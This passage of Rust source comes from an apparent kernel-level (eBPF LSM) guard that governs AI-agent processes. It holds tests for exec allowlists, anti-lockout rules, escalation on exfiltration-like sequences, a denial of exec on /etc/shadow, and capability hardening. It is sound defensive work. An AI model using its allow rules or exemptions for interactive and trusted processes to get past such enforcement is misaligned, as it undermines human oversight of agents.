            normalized.ends_with(basename),
            "basename normalization should preserve leaf name, got {normalized}"
        );
    }

    #[test]
    fn normalized_paths_drive_scope_classification() {
        let scoped = normalize_lsm_resource_path(std::process::id(), "/tmp/jinnguard-test/example");
        assert!(is_enforcement_target(&scoped));

        let home_noise = "/home/alice/.com.google.Chrome.tmp";
        assert!(!is_enforcement_target(&normalize_lsm_resource_path(
            std::process::id(),
            home_noise
        )));
        assert!(!is_enforcement_target("/home/alice/file"));
        assert!(!is_enforcement_target("/home/alice/jinnguard-test"));
        assert!(is_enforcement_target("/home/alice/jinnguard-test/file"));
    }

    fn test_lsm_request(req_type: LsmRequestType, resource: &str) -> LsmRequest {
        LsmRequest {
            cookie: 1,
            pid: std::process::id(),
            req_type,
            source_program: 0,
            family: 0,
            tty: None,
            is_interactive: false,
            process_path: None,
            resource: resource.to_string(),
            resolved_path: None,
            payload_preview: vec![],
        }
    }

    fn exec_policy(allowed_executables: Vec<&str>) -> PolicyConfig {
        let node = AgentNodePolicy {
            id: "scope-test-agent".to_string(),
            privilege_tier: 1,
            max_sequence_quota: 0,
            allowed_intents: vec![],
            allowed_executables: allowed_executables
                .into_iter()
                .map(ToString::to_string)
                .collect(),
            denied_write_paths: vec![],
            denied_unlink_paths: vec![],
            denied_dns_domains: vec![],
            invariants: vec![],
        };
        let mut agent_nodes = HashMap::new();
        agent_nodes.insert(node.id.clone(), node);

        PolicyConfig {
            upper_safety_boundary: 90.0,
            minimum_trust_score: 0.0,
            agent_nodes,
            deny_anonymous_agents: false,
            allow_anonymous_override: false,
            network_policy: NetworkPolicy::default(),
            runtime_policy: RuntimePolicy::default(),
            fleet_policy_min_version: 0,
            accept_cross_machine_lineage: false,
            canary_resources: Vec::new(),
        }
    }

    #[test]
    fn exec_outside_test_scope_always_allows_desktop_helpers() {
        let policy = exec_policy(vec!["/tmp/jinnguard-test/allowed"]);

        for path in ["/usr/bin/exo-open", "/bin/sh", "/opt/non-test-zone/tool"] {
            let request = test_lsm_request(LsmRequestType::Execve, path);
            assert!(
                matches!(lsm_exec_verdict(&request, &policy), Verdict::Allow),
                "exec outside explicit test zones must allow {path}"
            );
        }
    }

    #[test]
    fn exec_inside_test_scope_remains_policy_enforceable() {
        let policy = exec_policy(vec!["/tmp/jinnguard-test/allowed"]);

        let denied = test_lsm_request(LsmRequestType::Execve, "/tmp/jinnguard-test/blocked");
        assert!(
            matches!(lsm_exec_verdict(&denied, &policy), Verdict::Deny),
            "test-zone exec missing from allowlist should remain deny-capable"
        );

        let allowed = test_lsm_request(LsmRequestType::Execve, "/tmp/jinnguard-test/allowed");
        assert!(
            matches!(lsm_exec_verdict(&allowed, &policy), Verdict::Allow),
            "test-zone exec on allowlist should be allowed"
        );
    }

    #[test]
    fn lsm_path_cache_stores_scoped_create_path() {
        let cache = LsmPathResolutionCache::new();
        let mut request = test_lsm_request(
            LsmRequestType::InodeCreate,
            "/tmp/jinnguard-test/cache-create",
        );

        cache.resolve_request(&mut request);

        assert_eq!(
            cache.resolve("cache-create").as_deref(),
            Some("/tmp/jinnguard-test/cache-create")
        );
        assert_eq!(request.effective_path(), "/tmp/jinnguard-test/cache-create");
    }

    #[test]
    fn lsm_path_cache_resolves_basename_unlink_to_scoped_path() {
        let cache = LsmPathResolutionCache::new();
        cache.cache_if_scoped("cache-unlink", "/tmp/jinnguard-test/cache-unlink");
        let mut request = test_lsm_request(LsmRequestType::InodeUnlink, "cache-unlink");

        cache.resolve_request(&mut request);

        assert_eq!(request.effective_path(), "/tmp/jinnguard-test/cache-unlink");
        assert!(is_enforcement_target(request.effective_path()));
    }

    #[test]
    fn lsm_path_cache_ignores_normal_home_path() {
        let cache = LsmPathResolutionCache::new();
        cache.cache_if_scoped("desktop-noise", "/home/alice/.com.google.Chrome.tmp");

        assert!(cache.resolve("desktop-noise").is_none());
    }

    #[test]
    fn lsm_path_cache_ignores_expired_entry() {
        let cache = LsmPathResolutionCache::new();
        let old = current_time_ms().saturating_sub(31_000);
        cache.insert_for_test("expired", "/tmp/jinnguard-test/expired", old);

        assert!(cache.resolve("expired").is_none());
    }

    #[test]
    fn lsm_path_cache_miss_does_not_fabricate_protected_path() {
        let cache = LsmPathResolutionCache::new();
        let mut request = test_lsm_request(LsmRequestType::InodeUnlink, "missing-cache-entry");

        cache.resolve_request(&mut request);

        assert!(request.effective_path().ends_with("missing-cache-entry"));
        assert!(!request.effective_path().starts_with("/etc/"));
        assert!(!request.effective_path().starts_with("/usr/"));
        assert!(!request.effective_path().starts_with("/bin/"));
        assert!(!request.effective_path().starts_with("/lib/"));
    }
}

#[cfg(test)]
mod origin_enforcement_tests {
    use super::{
        is_protected_system_path, is_trusted_process, lsm_exec_verdict, lsm_origin_gate_verdict,
        AgentNodePolicy, NetworkPolicy, PolicyConfig, RuntimePolicy,
    };
    use crate::ebpf_monitor::{LsmRequest, LsmRequestType, Verdict};
    use std::collections::HashMap;

    fn test_lsm_request(resource: &str) -> LsmRequest {
        LsmRequest {
            cookie: 1,
            pid: std::process::id(),
            req_type: LsmRequestType::Execve,
            source_program: 0,
            family: 0,
            tty: None,
            is_interactive: false,
            process_path: Some("/opt/jinn-agent/runner".to_string()),
            resource: resource.to_string(),
            resolved_path: None,
            payload_preview: vec![],
        }
    }

    fn exec_policy(allowed_executables: Vec<&str>) -> PolicyConfig {
        let node = AgentNodePolicy {
            id: "origin-test-agent".to_string(),
            privilege_tier: 1,
            max_sequence_quota: 0,
            allowed_intents: vec![],
            allowed_executables: allowed_executables
                .into_iter()
                .map(ToString::to_string)
                .collect(),
            denied_write_paths: vec![],
            denied_unlink_paths: vec![],
            denied_dns_domains: vec![],
            invariants: vec![],
        };
        let mut agent_nodes = HashMap::new();
        agent_nodes.insert(node.id.clone(), node);

        PolicyConfig {
            upper_safety_boundary: 90.0,
            minimum_trust_score: 0.0,
            agent_nodes,
            deny_anonymous_agents: false,
            allow_anonymous_override: false,
            network_policy: NetworkPolicy::default(),
            runtime_policy: RuntimePolicy::default(),
            fleet_policy_min_version: 0,
            accept_cross_machine_lineage: false,
            canary_resources: Vec::new(),
        }
    }

    #[test]
    fn interactive_process_allows_before_test_zone_policy() {
        let policy = exec_policy(vec!["/tmp/jinnguard-test/allowed"]);
        let mut request = test_lsm_request("/tmp/jinnguard-test/blocked");
        request.tty = Some("pts/0".to_string());
        request.is_interactive = request.tty.is_some();

        assert!(matches!(
            lsm_origin_gate_verdict(&request),
            Some(Verdict::Allow)
        ));
        assert!(matches!(
            lsm_exec_verdict(&request, &policy),
            Verdict::Allow
        ));
    }

    #[test]
    fn trusted_toolchain_process_allows_before_test_zone_policy() {
        let policy = exec_policy(vec!["/tmp/jinnguard-test/allowed"]);
        let mut request = test_lsm_request("/tmp/jinnguard-test/blocked");
        request.process_path = Some("/usr/bin/cargo".to_string());

        assert!(is_trusted_process(&request));
        assert!(matches!(
            lsm_origin_gate_verdict(&request),
            Some(Verdict::Allow)
        ));
        assert!(matches!(
            lsm_exec_verdict(&request, &policy),
            Verdict::Allow
        ));
    }

    #[test]
    fn non_interactive_unknown_process_inside_test_scope_remains_enforceable() {
        let policy = exec_policy(vec!["/tmp/jinnguard-test/allowed"]);
        let request = test_lsm_request("/tmp/jinnguard-test/blocked");

        assert!(lsm_origin_gate_verdict(&request).is_none());
        assert!(matches!(lsm_exec_verdict(&request, &policy), Verdict::Deny));
    }

    #[test]
    fn protected_system_path_overrides_interactive_and_trusted_allow() {
        let policy = exec_policy(vec!["/etc/shadow"]);
        let mut request = test_lsm_request("/etc/shadow");
        request.tty = Some("pts/0".to_string());
        request.is_interactive = request.tty.is_some();
        request.process_path = Some("/usr/bin/cargo".to_string());

        assert!(is_protected_system_path(request.effective_path()));
        assert!(matches!(
            lsm_origin_gate_verdict(&request),
            Some(Verdict::Deny)
        ));
        assert!(matches!(lsm_exec_verdict(&request, &policy), Verdict::Deny));
    }
}

/// Anti-lockout invariants. The operator's machine must remain administrable
/// and bootable with kernel enforcement fully armed (safe_mode = false). A
/// regression in this module is the exact failure that previously prevented the
/// operator from loading their desktop, so a break here MUST fail CI. These
/// tests pin the guarantee at the verdict-function level so it cannot silently
/// drift when enforcement scope, immunity lists, or gate ordering are changed.
#[cfg(test)]
mod operator_safety_invariants {
    use super::{
        is_path_in_test_scope, lsm_exec_verdict, AgentNodePolicy, NetworkPolicy, PolicyConfig,
        RuntimePolicy,
    };
    use crate::ebpf_monitor::{LsmRequest, LsmRequestType, Verdict};
    use std::collections::HashMap;

    /// Base-system and desktop-critical executables. Denying execve on any of
    /// these with enforcement armed locks the operator out of their machine.
    const OPERATOR_CRITICAL_EXECUTABLES: &[&str] = &[
        "/lib/systemd/systemd",
        "/usr/lib/systemd/systemd",
        "/sbin/init",
        "/usr/sbin/lightdm",
        "/usr/bin/lightdm",
        "/usr/lib/xorg/Xorg",
        "/usr/bin/Xorg",
        "/usr/sbin/getty",
        "/usr/bin/getty",
        "/bin/bash",
        "/usr/bin/bash",
        "/bin/sh",
        "/usr/bin/dash",
        "/usr/bin/env",
        "/usr/bin/systemctl",
        "/usr/bin/sudo",
        "/usr/bin/dbus-daemon",
        "/usr/bin/Xorg",
    ];

    /// A fully-armed governance policy: aggressive denylists and a real
    /// executable allowlist (so enforcement is genuinely live, not vacuous).
    fn armed_policy() -> PolicyConfig {
        let node = AgentNodePolicy {
            id: "agent".to_string(),
            privilege_tier: 1,
            max_sequence_quota: 0,
            allowed_intents: vec![],
            // Non-empty allowlist makes lsm_exec_verdict enforce: anything not
            // listed and inside governed scope is denied.
            allowed_executables: vec!["/tmp/jinnguard-test/allowed".to_string()],
            denied_write_paths: vec!["/".to_string()],
            denied_unlink_paths: vec!["/".to_string()],
            denied_dns_domains: vec![],
            invariants: vec![],
        };
        let mut agent_nodes = HashMap::new();
        agent_nodes.insert(node.id.clone(), node);
        PolicyConfig {
            upper_safety_boundary: 50.0,
            minimum_trust_score: 0.0,
            agent_nodes,
            deny_anonymous_agents: true,
            allow_anonymous_override: false,
            network_policy: NetworkPolicy::default(),
            runtime_policy: RuntimePolicy::default(),
            fleet_policy_min_version: 0,
            accept_cross_machine_lineage: false,
            canary_resources: Vec::new(),
        }
    }

    fn execve_request(process_path: &str, resource: &str) -> LsmRequest {
        LsmRequest {
            cookie: 1,
            pid: std::process::id(),
            req_type: LsmRequestType::Execve,
            source_program: 0,
            family: 0,
            tty: None,
            is_interactive: false,
            process_path: Some(process_path.to_string()),
            resource: resource.to_string(),
            resolved_path: None,
            payload_preview: vec![],
        }
    }

    #[test]
    fn operator_critical_executables_allowed_with_enforcement_armed() {
        let policy = armed_policy();
        for exe in OPERATOR_CRITICAL_EXECUTABLES {
            let request = execve_request(exe, exe);
            let verdict = lsm_exec_verdict(&request, &policy);
            assert!(
                matches!(verdict, Verdict::Allow),
                "ANTI-LOCKOUT REGRESSION: operator-critical executable {exe} was not \
                 ALLOWED with enforcement armed (got {verdict:?}). This is the exact \
                 failure that prevents the operator from loading their desktop."
            );
        }
    }

    #[test]
    fn system_prefixes_are_never_in_governed_scope() {
        // The host stays administrable because base-system path prefixes are
        // excluded from the enforceable scope. If this regresses, ordinary
        // system activity becomes subject to denial.
        for path in [
            "/usr/lib/xorg/Xorg",
            "/bin/bash",
            "/lib/systemd/systemd",
            "/etc/passwd",
            "/sbin/init",
        ] {
            assert!(
                !is_path_in_test_scope(path),
                "ANTI-LOCKOUT REGRESSION: system path {path} entered governed \
                 enforcement scope; host processes could now be denied."
            );
        }
    }

    #[test]
    fn enforcement_is_not_vacuous_inside_governed_scope() {
        // Proves the anti-lockout allow rules do not disable real enforcement:
        // a non-interactive, untrusted agent process acting inside the governed
        // scope on a non-allowlisted target is still denied. If this flips to
        // Allow, the product no longer does what it claims.
        let policy = armed_policy();
        let request = execve_request("/opt/agent/runner", "/tmp/jinnguard-test/payload");
        let verdict = lsm_exec_verdict(&request, &policy);
        assert!(
            matches!(verdict, Verdict::Deny),
            "Enforcement must remain live for governed-scope agent actions \
             (got {verdict:?}); otherwise kernel governance is a no-op."
        );
    }
}

/// Safe-mode guarantee (kernel build): with JINNGUARD_SAFE_MODE the daemon is
/// audit-only and every verdict is ALLOW, so arming the kernel layer can never
/// strand the operator. Gated behind the same feature as the verdict loop.
#[cfg(all(test, feature = "kernel_telemetry"))]
mod safe_mode_invariants {
    use super::{lsm_policy_verdict, AgentNodePolicy, NetworkPolicy, PolicyConfig, RuntimePolicy};
    use crate::ebpf_monitor::{LsmRequest, LsmRequestType, Verdict};
    use std::collections::HashMap;

    fn armed_policy() -> PolicyConfig {
        let node = AgentNodePolicy {
            id: "agent".to_string(),
            privilege_tier: 1,
            max_sequence_quota: 0,
            allowed_intents: vec![],
            allowed_executables: vec!["/tmp/jinnguard-test/allowed".to_string()],
            denied_write_paths: vec!["/".to_string()],
            denied_unlink_paths: vec!["/".to_string()],
            denied_dns_domains: vec![],
            invariants: vec![],
        };
        let mut agent_nodes = HashMap::new();
        agent_nodes.insert(node.id.clone(), node);
        PolicyConfig {
            upper_safety_boundary: 50.0,
            minimum_trust_score: 0.0,
            agent_nodes,
            deny_anonymous_agents: true,
            allow_anonymous_override: false,
            network_policy: NetworkPolicy::default(),
            runtime_policy: RuntimePolicy::default(),
            fleet_policy_min_version: 0,
            accept_cross_machine_lineage: false,
            canary_resources: Vec::new(),
        }
    }

    fn execve_request(process_path: &str, resource: &str) -> LsmRequest {
        LsmRequest {
            cookie: 1,
            pid: std::process::id(),
            req_type: LsmRequestType::Execve,
            source_program: 0,
            family: 0,
            tty: None,
            is_interactive: false,
            process_path: Some(process_path.to_string()),
            resource: resource.to_string(),
            resolved_path: None,
            payload_preview: vec![],
        }
    }

    #[test]
    fn safe_mode_allows_action_that_would_be_denied_when_armed() {
        let policy = armed_policy();
        // Identical request is denied when armed (see operator_safety_invariants)
        // but must be allowed under safe mode.
        let request = execve_request("/opt/agent/runner", "/tmp/jinnguard-test/payload");
        assert!(
            matches!(lsm_policy_verdict(&request, &policy, false), Verdict::Deny),
            "precondition: this request must be denied when enforcement is armed"
        );
        assert!(
            matches!(lsm_policy_verdict(&request, &policy, true), Verdict::Allow),
            "SAFE-MODE REGRESSION: safe mode must be audit-only (ALLOW everything) \
             so the operator always retains control."
        );
    }
}

#[cfg(test)]
mod intent_enforcement_tests {
    use super::{lsm_intent_response_verdict, lsm_origin_gate_verdict};
    use crate::ebpf_monitor::{LsmRequest, LsmRequestType, Verdict};
    use crate::explainability::{
        classify_intent, clear_intent_tracking_for_test, intent_tracking_test_guard, record_intent,
        IntentRiskLevel,
    };

    fn test_lsm_request(pid: u32, req_type: LsmRequestType, resource: &str) -> LsmRequest {
        LsmRequest {
            cookie: 1,
            pid,
            req_type,
            source_program: 0,
            family: 0,
            tty: None,
            is_interactive: false,
            process_path: Some("/opt/jinn-agent/runner".to_string()),
            resource: resource.to_string(),
            resolved_path: None,
            payload_preview: vec![],
        }
    }

    fn final_gate_verdict(request: &LsmRequest, risk: &IntentRiskLevel) -> Verdict {
        if let Some(verdict) = lsm_origin_gate_verdict(request) {
            return verdict;
        }
        if let Some(verdict) = lsm_intent_response_verdict(request, risk) {
            return verdict;
        }
        Verdict::Allow
    }

    fn drive_high_risk_sequence(pid: u32, final_resource: &str) -> (LsmRequest, IntentRiskLevel) {
        clear_intent_tracking_for_test();
        let exec = test_lsm_request(pid, LsmRequestType::Execve, "/tmp/jinnguard-test/tool");
        let write = test_lsm_request(pid, LsmRequestType::InodeCreate, "/tmp/jinnguard-test/file");
        let network = test_lsm_request(pid, LsmRequestType::Connect, final_resource);

        let _ = record_intent(&exec, classify_intent(&exec));
        let _ = record_intent(&write, classify_intent(&write));
        let (_pattern, risk) = record_intent(&network, classify_intent(&network));

        (network, risk)
    }

    #[test]
    fn single_high_risk_sequence_inside_test_scope_logs_without_deny() {
        let _guard = intent_tracking_test_guard();
        let (request, risk) = drive_high_risk_sequence(800_001, "/tmp/jinnguard-test/exfil");

        assert_eq!(risk, IntentRiskLevel::High);
        assert!(matches!(lsm_intent_response_verdict(&request, &risk), None));
        assert!(matches!(
            final_gate_verdict(&request, &risk),
            Verdict::Allow
        ));
    }

    #[test]
    fn high_risk_sequence_interactive_still_allows() {
        let _guard = intent_tracking_test_guard();
        let (mut request, risk) = drive_high_risk_sequence(800_002, "/tmp/jinnguard-test/exfil");
        request.tty = Some("pts/0".to_string());
        request.is_interactive = request.tty.is_some();

        assert_eq!(risk, IntentRiskLevel::High);
        assert!(matches!(
            final_gate_verdict(&request, &risk),
            Verdict::Allow
        ));
    }

    #[test]
    fn high_risk_sequence_outside_test_scope_still_allows() {
        let _guard = intent_tracking_test_guard();
        let (request, risk) = drive_high_risk_sequence(800_003, "/opt/outside/exfil");

        assert_eq!(risk, IntentRiskLevel::High);
        assert!(matches!(
            final_gate_verdict(&request, &risk),
            Verdict::Allow
        ));
    }

    #[test]
    fn high_risk_sequence_from_trusted_toolchain_still_allows() {
        let _guard = intent_tracking_test_guard();
        let (mut request, risk) = drive_high_risk_sequence(800_004, "/tmp/jinnguard-test/exfil");
        request.process_path = Some("/usr/bin/cargo".to_string());

        assert_eq!(risk, IntentRiskLevel::High);
        assert!(matches!(
            final_gate_verdict(&request, &risk),
            Verdict::Allow
        ));
    }
}

#[cfg(test)]
mod escalation_tests {
    use super::{lsm_intent_response_verdict, lsm_origin_gate_verdict};
    use crate::ebpf_monitor::{LsmRequest, LsmRequestType, Verdict};
    use crate::explainability::{
        classify_intent, clear_intent_tracking_for_test, intent_tracking_test_guard, is_escalated,
        record_intent,
    };

    fn test_lsm_request(pid: u32, req_type: LsmRequestType, resource: &str) -> LsmRequest {
        LsmRequest {
            cookie: 1,
            pid,
            req_type,
            source_program: 0,
            family: 0,
            tty: None,
            is_interactive: false,
            process_path: Some("/opt/jinn-agent/runner".to_string()),
            resource: resource.to_string(),
            resolved_path: None,
            payload_preview: vec![],
        }
    }

    fn evaluate_like_policy(request: &LsmRequest) -> Verdict {
        if let Some(verdict) = lsm_origin_gate_verdict(request) {
            return verdict;
        }

        let (_pattern, risk) = record_intent(request, classify_intent(request));
        if let Some(verdict) = lsm_intent_response_verdict(request, &risk) {
            return verdict;
        }

        Verdict::Allow
    }

    fn run_high_risk_sequence(
        pid: u32,
        final_resource: &str,
        interactive: bool,
        process_path: &str,
    ) -> Verdict {
        let events = [
            (LsmRequestType::Execve, "/tmp/jinnguard-test/tool"),
            (LsmRequestType::InodeCreate, "/tmp/jinnguard-test/file"),
            (LsmRequestType::Connect, final_resource),
        ];

        let mut verdict = Verdict::Allow;
        for (req_type, resource) in events {
            let mut request = test_lsm_request(pid, req_type, resource);
            request.tty = interactive.then(|| "pts/0".to_string());
            request.is_interactive = request.tty.is_some();
            request.process_path = Some(process_path.to_string());
            verdict = evaluate_like_policy(&request);
        }

        verdict
    }

    #[test]
    fn single_high_risk_event_logs_without_deny() {
        let _guard = intent_tracking_test_guard();
        clear_intent_tracking_for_test();
        let pid = 810_001;

        let verdict = run_high_risk_sequence(
            pid,
            "/tmp/jinnguard-test/exfil",
            false,
            "/opt/jinn-agent/runner",
        );

        assert!(matches!(verdict, Verdict::Allow));
        assert!(!is_escalated(pid));
    }

    #[test]
    fn three_repeated_high_risk_events_escalate_to_deny() {
        let _guard = intent_tracking_test_guard();
        clear_intent_tracking_for_test();
        let pid = 810_002;
        let mut verdict = Verdict::Allow;

        for _ in 0..3 {
            verdict = run_high_risk_sequence(
                pid,
                "/tmp/jinnguard-test/exfil",
                false,
                "/opt/jinn-agent/runner",
            );
        }

        assert!(is_escalated(pid));
        assert!(matches!(verdict, Verdict::Deny));
    }

    #[test]
    fn repeated_interactive_behavior_never_escalates() {
        let _guard = intent_tracking_test_guard();
        clear_intent_tracking_for_test();
        let pid = 810_003;

        for _ in 0..5 {
            let verdict = run_high_risk_sequence(
                pid,
                "/tmp/jinnguard-test/exfil",
                true,
                "/opt/jinn-agent/runner",
            );
            assert!(matches!(verdict, Verdict::Allow));
        }

        assert!(!is_escalated(pid));
    }

    #[test]
    fn repeated_trusted_toolchain_behavior_never_escalates() {
        let _guard = intent_tracking_test_guard();
        clear_intent_tracking_for_test();
        let pid = 810_004;

        for _ in 0..5 {
            let verdict =
                run_high_risk_sequence(pid, "/tmp/jinnguard-test/exfil", false, "/usr/bin/cargo");
            assert!(matches!(verdict, Verdict::Allow));
        }

        assert!(!is_escalated(pid));
    }

    #[test]
    fn repeated_outside_scope_behavior_never_escalates() {
        let _guard = intent_tracking_test_guard();
        clear_intent_tracking_for_test();
        let pid = 810_005;

        for _ in 0..5 {
            let verdict =
                run_high_risk_sequence(pid, "/opt/outside/exfil", false, "/opt/jinn-agent/runner");
            assert!(matches!(verdict, Verdict::Allow));
        }

        assert!(!is_escalated(pid));
    }
}

#[cfg(all(test, feature = "kernel_telemetry"))]
mod kernel_network_policy_mirror_tests {
    use super::{lsm_network_verdict, NetworkPolicy};
    use crate::ebpf_monitor::{LsmRequest, LsmRequestType, Verdict};

    fn unix_connect(path: &str) -> LsmRequest {
        LsmRequest {
            cookie: 1,
            pid: std::process::id(),
            req_type: LsmRequestType::Connect,
            source_program: 0,
            family: libc::AF_UNIX as u16,
            tty: None,
            is_interactive: false,
            process_path: None,
            resource: path.to_string(),
            resolved_path: None,
            payload_preview: vec![],
        }
    }

    #[test]
    fn unix_default_deny_uses_exact_allowlist_match() {
        let policy = NetworkPolicy {
            unix_default_deny: true,
            allowed_unix_sockets: vec!["/tmp/allowed.sock".to_string()],
            ..NetworkPolicy::default()
        };

        assert!(matches!(
            lsm_network_verdict(&unix_connect("/tmp/allowed.sock"), &policy),
            Verdict::Allow
        ));
        assert!(matches!(
            lsm_network_verdict(&unix_connect("/tmp/allowed.sock.evil"), &policy),
            Verdict::Deny
        ));
    }

    #[test]
    fn unix_connects_follow_unix_default_deny_not_ipv4_default_deny() {
        let policy = NetworkPolicy {
            default_deny: true,
            unix_default_deny: false,
            allowed_unix_sockets: Vec::new(),
            ..NetworkPolicy::default()
        };

        assert!(matches!(
            lsm_network_verdict(&unix_connect("/tmp/not-listed.sock"), &policy),
            Verdict::Allow
        ));
    }
}

#[cfg(test)]
mod identity_tracking_tests {
    use super::{lsm_intent_response_verdict, lsm_origin_gate_verdict};
    use crate::ebpf_monitor::{LsmRequest, LsmRequestType, Verdict};
    use crate::explainability::{
        classify_intent, clear_intent_tracking_for_test, compute_agent_identity,
        intent_tracking_test_guard, is_agent_escalated, record_intent,
    };

    fn test_lsm_request(
        pid: u32,
        req_type: LsmRequestType,
        resource: &str,
        process_path: &str,
    ) -> LsmRequest {
        LsmRequest {
            cookie: 1,
            pid,
            req_type,
            source_program: 0,
            family: 0,
            tty: None,
            is_interactive: false,
            process_path: Some(process_path.to_string()),
            resource: resource.to_string(),
            resolved_path: None,
            payload_preview: vec![],
        }
    }

    fn evaluate_like_policy(request: &LsmRequest) -> Verdict {
        if let Some(verdict) = lsm_origin_gate_verdict(request) {
            return verdict;
        }

        let (_pattern, risk) = record_intent(request, classify_intent(request));
        if let Some(verdict) = lsm_intent_response_verdict(request, &risk) {
            return verdict;
        }

        Verdict::Allow
    }

    fn run_high_risk_sequence(pid: u32, process_path: &str) -> Verdict {
        let events = [
            (LsmRequestType::Execve, "/tmp/jinnguard-test/tool"),
            (LsmRequestType::InodeCreate, "/tmp/jinnguard-test/file"),
            (LsmRequestType::Connect, "/tmp/jinnguard-test/exfil"),
        ];

        let mut verdict = Verdict::Allow;
        for (req_type, resource) in events {
            let request = test_lsm_request(pid, req_type, resource, process_path);
            verdict = evaluate_like_policy(&request);
        }

        verdict
    }

    #[test]
    fn same_agent_restarting_new_pid_keeps_reputation() {
        let _guard = intent_tracking_test_guard();
        clear_intent_tracking_for_test();
        let process_path = "/opt/jinn-agent/runner";
        let identity = compute_agent_identity(&test_lsm_request(
            820_001,
            LsmRequestType::Connect,
            "",
            process_path,
        ));

        assert!(matches!(
            run_high_risk_sequence(820_001, process_path),
            Verdict::Allow
        ));
        assert!(matches!(
            run_high_risk_sequence(820_002, process_path),
            Verdict::Allow
        ));
        assert!(!is_agent_escalated(&identity));

        assert!(matches!(
            run_high_risk_sequence(820_003, process_path),
            Verdict::Deny
        ));
        assert!(is_agent_escalated(&identity));
    }

    #[test]
    fn different_binary_uses_separate_reputation() {
        let _guard = intent_tracking_test_guard();
        clear_intent_tracking_for_test();
        let first = "/opt/jinn-agent/runner-a";
        let second = "/opt/jinn-agent/runner-b";
        let first_identity = compute_agent_identity(&test_lsm_request(
            821_001,
            LsmRequestType::Connect,
            "",
            first,
        ));
        let second_identity = compute_agent_identity(&test_lsm_request(
            821_004,
            LsmRequestType::Connect,
            "",
            second,
        ));

        for pid in [821_001, 821_002, 821_003] {
            let _ = run_high_risk_sequence(pid, first);
        }

        assert!(is_agent_escalated(&first_identity));
        assert!(matches!(
            run_high_risk_sequence(821_004, second),
            Verdict::Allow
        ));
        assert!(!is_agent_escalated(&second_identity));
    }

    #[test]
    fn trusted_toolchain_does_not_accumulate_reputation() {
        let _guard = intent_tracking_test_guard();
        clear_intent_tracking_for_test();
        let process_path = "/usr/bin/cargo";
        let identity = compute_agent_identity(&test_lsm_request(
            822_001,
            LsmRequestType::Connect,
            "",
            process_path,
        ));

        for pid in [822_001, 822_002, 822_003, 822_004] {
            assert!(matches!(
                run_high_risk_sequence(pid, process_path),
                Verdict::Allow
            ));
        }

        assert!(!is_agent_escalated(&identity));
    }
}

// ---------------------------------------------------------------------------
// main
// ---------------------------------------------------------------------------

/// Opt-in post-load capability hardening (`JINNGUARD_HARDEN_CAPS=1`).
///
/// After the LSM programs are loaded and attached the daemon no longer needs to
/// acquire new privileges. This module sets `no_new_privs` and drops a curated
/// set of dangerous capabilities from the **bounding set**. Dropping from the
/// bounding set does NOT remove capabilities already in the effective set, so
/// the daemon's steady-state work (BPF map writes, `/proc` enrichment of other
/// processes) keeps working — it only prevents the daemon, or any child it
/// spawns, from ever *acquiring* the dropped capabilities post-compromise.
pub mod capability_hardening {
    /// `(name, capability number)` to drop from the bounding set. These are
    /// capabilities the daemon provably never needs after BPF load.
    pub const DROP_FROM_BOUNDING_SET: &[(&str, i32)] = &[
        ("CAP_NET_ADMIN", 12),
        ("CAP_NET_RAW", 13),
        ("CAP_SYS_MODULE", 16),
        ("CAP_SYS_RAWIO", 17),
        ("CAP_SYS_BOOT", 22),
        ("CAP_SYS_NICE", 23),
        ("CAP_SYS_TIME", 25),
        ("CAP_MKNOD", 27),
        ("CAP_AUDIT_CONTROL", 30),
        ("CAP_SYSLOG", 34),
    ];

    /// Capabilities the daemon MUST keep at runtime; the drop list must never
    /// intersect this set (enforced by a unit test).
    pub const RETAINED_CAPS: &[(&str, i32)] = &[
        ("CAP_DAC_OVERRIDE", 1),
        ("CAP_DAC_READ_SEARCH", 2),
        ("CAP_SETPCAP", 8),       // needed to perform the bounding-set drop itself
        ("CAP_SYS_PTRACE", 19),   // /proc enrichment of other processes
        ("CAP_SYS_ADMIN", 21),    // BPF map ops on kernels without split CAP_BPF
        ("CAP_SYS_RESOURCE", 24), // memlock rlimit for BPF
        ("CAP_BPF", 39),
    ];

    pub fn enabled() -> bool {
        std::env::var("JINNGUARD_HARDEN_CAPS")
            .map(|v| v == "1")
            .unwrap_or(false)
    }

    /// Set `no_new_privs` and drop the bounding-set capabilities. Best-effort:
    /// failures are logged, never fatal (hardening must not break enforcement).
    pub fn apply() {
        let nnp = unsafe { libc::prctl(libc::PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) };
        if nnp == 0 {
            eprintln!("[hardening] no_new_privs set");
        } else {
            eprintln!(
                "[hardening] warning: PR_SET_NO_NEW_PRIVS failed: {}",
                std::io::Error::last_os_error()
            );
        }

        let mut dropped = 0usize;
        for (name, cap) in DROP_FROM_BOUNDING_SET {
            let r = unsafe { libc::prctl(libc::PR_CAPBSET_DROP, *cap as libc::c_ulong, 0, 0, 0) };
            if r == 0 {
                dropped += 1;
            } else {
                eprintln!(
                    "[hardening] note: could not drop {name} from bounding set: {}",
                    std::io::Error::last_os_error()
                );
            }
        }
        eprintln!(
            "[hardening] dropped {dropped}/{} dangerous capabilities from the bounding set",
            DROP_FROM_BOUNDING_SET.len()
        );

        // Effective-set deprivilege: reduce the live (effective + permitted)
        // capability set to exactly RETAINED_CAPS, so the daemon cannot *use* a
        // dangerous capability post-compromise — not merely cannot re-acquire it
        // (which is all the bounding-set drop above achieves). Best-effort.
        match drop_effective_to_retained() {
            Ok(()) => eprintln!(
                "[hardening] reduced effective/permitted caps to the {} required by the daemon",
                RETAINED_CAPS.len()
            ),
            Err(e) => eprintln!(
                "[hardening] warning: effective-set deprivilege failed ({e}); \
                 bounding-set drop still applied"
            ),
        }
    }

    /// 64-bit mask of the capabilities the daemon retains at runtime.
    pub fn retained_mask() -> u64 {
        RETAINED_CAPS
            .iter()
            .fold(0u64, |m, (_, cap)| m | (1u64 << cap))
    }

    /// Set the calling process's effective + permitted (and inheritable)
    /// capability sets to exactly [`RETAINED_CAPS`] via `capset(2)`. Reducing one's
    /// own capabilities never requires extra privilege, so this only ever *removes*
    /// caps. Returns `Err(errno)` if the syscall fails.
    ///
    /// The pinned `libc` crate does not expose the capset structs, so the kernel
    /// ABI (`linux/capability.h`, `_LINUX_CAPABILITY_VERSION_3`) is declared here
    /// and invoked through the raw `SYS_capset` syscall.
    pub fn drop_effective_to_retained() -> Result<(), i32> {
        const LINUX_CAPABILITY_VERSION_3: u32 = 0x2008_0522;

        #[repr(C)]
        struct CapHeader {
            version: u32,
            pid: i32,
        }
        #[repr(C)]
        #[derive(Clone, Copy)]
        struct CapData {
            effective: u32,
            permitted: u32,
            inheritable: u32,
        }

        let mask = retained_mask();
        let header = CapHeader {
